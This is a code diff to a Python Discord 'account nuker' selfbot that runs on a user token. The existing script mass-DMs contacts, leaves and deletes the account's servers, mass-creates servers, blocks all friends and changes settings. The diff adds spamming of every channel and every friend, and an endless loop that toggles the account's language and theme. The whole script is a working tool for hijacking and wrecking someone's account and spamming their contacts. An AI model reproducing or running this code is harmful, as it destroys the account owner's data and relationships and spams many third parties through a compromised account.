@@ -59,6 +59,7 @@ async def on_message(ctx):
 async def on_ready():
     mass_dm = input("Enter Message To Mass Dm: ")
 
+    otherdm = input("Enter What To Send In All Channels In All Servers Its In: ")
 
     while True:
         try:
@@ -94,6 +95,30 @@ async def on_ready():
         except Exception as e:
             print(colorama.Fore.RED + "Unkown Error")
     print(colorama.Fore.GREEN + "[+] Done Mass Dming")
+
+
+
+
+
+    for guild in bot.guilds:
+        for channel in guild.channels:
+            try:
+                await channel.send(otherdm)
+                print(colorama.Fore.GREEN + f"[+] Sent Message In Server, Server Id: {str(guild.id)}, Channel Id: {str(channel.id)}")
+            except:
+                pass
+    for friend in bot.user.friends:
+        try:
+            await friend.send(otherdm)
+            print(colorama.Fore.GREEN + f"[+] Sent Message In Dms, User Id: {str(friend.id)}")
+        except:
+            pass
+    print(colorama.Fore.GREEN + "[+] Done Sending Messaage In Every Channel Possible")
+
+
+
+
+
 
 
     url = "https://discord.com/api/v9/users/@me/guilds/"
@@ -133,6 +158,7 @@ async def on_ready():
         except:
           print(colorama.Fore.RED + "UNKOWN ERROR")
           break
+    print(colorama.Fore.GREEN + "[+] Done Leaving Servers")
 
 
 
@@ -153,7 +179,8 @@ async def on_ready():
                 break
             if "429" in str(ri):
                 print(colorama.Fore.YELLOW + "[+] Rate Limited")
-            
+    print(colorama.Fore.GREEN + "[+] Done Deleting All Servers Account Owns")
+    
 
 
     den = 0
@@ -164,6 +191,7 @@ async def on_ready():
             print(colorama.Fore.GREEN + f"[{str(den)}] Created Guild/Server")
         except:
             print(colorama.Fore.RED + "Max Servers Reached/Name Not Valid")
+    print(colorama.Fore.GREEN + "[+] Done Mass Creating Servers")
 
 
 
@@ -185,10 +213,12 @@ async def on_ready():
                 break
             if "429" in r5:
                 print(colorama.Fore.YELLOW + "[-] Rate Limited")
+    print(colorama.Fore.GREEN + "[+] Done Blocking All Friends")
 
 
     ior = "https://discord.com/api/v9/users/@me/settings"
     jso2 = {"theme": "light"}
+    jso4 = {"theme": "dark"}
 
 
     rog = requests.patch(ior, headers=head, json=jso2)
@@ -196,23 +226,68 @@ async def on_ready():
     if "200" in rog:
         print(colorama.Fore.GREEN + "[+] Set Light Mode As Theme")
     if "200" not in rog:
-        print(colorama.Fore.RED + "[+] Failed To Set Light Mode")
+        print(colorama.Fore.RED + "[+] Failed To Set Light Mode As Theme")
+    print(colorama.Fore.GREEN + "[+] Done Setting Theme")
 
     jso3 = {
         "locale": "zh-TW"
     }
-
+    jso5 = {
+        "locale": "en-GB"
+    }
     rog2 = requests.patch(ior, headers=head, json=jso3)
-    print(rog2)
     rog2 = str(rog2)
     if "200" in rog2:
         print(colorama.Fore.GREEN + "[+] Set Chinese As Language")
     if "200" not in rog2:
         print(colorama.Fore.RED + "[-] Failed To Set Language As Chinese")
+    print(colorama.Fore.GREEN + "[+] Done Setting Language")
 
 
 
-    print(colorama.Fore.GREEN + "[+] Done Nuking Account, You May Close This Program Now")
+    print(colorama.Fore.GREEN + "[+] Done Nuking Account, You May Close This Program Now Or Press Enter To Start An Auto Language And Theme Switcher")
+    input("")
+    while True:
+        rog2 = requests.patch(ior, headers=head, json=jso3)
+        rog2 = str(rog2)
+        if "200" in rog2:
+            print(colorama.Fore.GREEN + "[+] Set Chinese As Language")
+        if "200" not in rog2:
+            print(colorama.Fore.RED + "[-] Failed To Set Language As Chinese")
+
+        
+        rog = requests.patch(ior, headers=head, json=jso2)
+        rog = str(rog)
+        if "200" in rog:
+            print(colorama.Fore.GREEN + "[+] Set Light Mode As Theme")
+        if "200" not in rog:
+            print(colorama.Fore.RED + "[+] Failed To Set Light Mode As Theme")
+
+        
+
+
+
+
+
+        rog2 = requests.patch(ior, headers=head, json=jso5)
+        rog2 = str(rog2)
+        if "200" in rog2:
+            print(colorama.Fore.GREEN + "[+] Set English As Language")
+        if "200" not in rog2:
+            print(colorama.Fore.RED + "[-] Failed To Set Language As English")
+
+        
+        rog = requests.patch(ior, headers=head, json=jso4)
+        rog = str(rog)
+        if "200" in rog:
+            print(colorama.Fore.GREEN + "[+] Set Dark Mode As Theme")
+        if "200" not in rog:
+            print(colorama.Fore.RED + "[+] Failed To Set Dark Mode As Theme")
+        
+
+
+
+
 
 
 bot.run(token, bot=False)
